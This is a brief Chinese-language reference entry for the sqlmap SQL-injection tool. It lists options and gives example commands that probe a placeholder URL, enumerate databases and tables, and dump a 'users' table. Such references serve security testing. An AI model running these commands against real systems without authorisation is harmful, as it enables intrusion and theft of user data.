# sqlmap 命令

## 命令说明
SQL注入工具，用于自动检测和利用SQL注入漏洞。

## 语法
```
sqlmap [选项]
```

## 常用选项
- `-u`：指定目标URL
- `--dbs`：枚举数据库
- `--tables`：枚举表
- `--columns`：枚举列
- `--dump`：转储数据
- `-D`：指定数据库
- `-T`：指定表
- `-C`：指定列

## 示例
```bash
# 检测SQL注入
sqlmap -u "http://example.com/page.php?id=1"

# 枚举数据库
sqlmap -u "http://example.com/page.php?id=1" --dbs

# 枚举表
sqlmap -u "http://example.com/page.php?id=1" -D database --tables

# 转储数据
sqlmap -u "http://example.com/page.php?id=1" -D database -T users --dump
```

## 适用场景
- SQL注入漏洞检测
- 数据库信息获取
- 数据提取
- 安全评估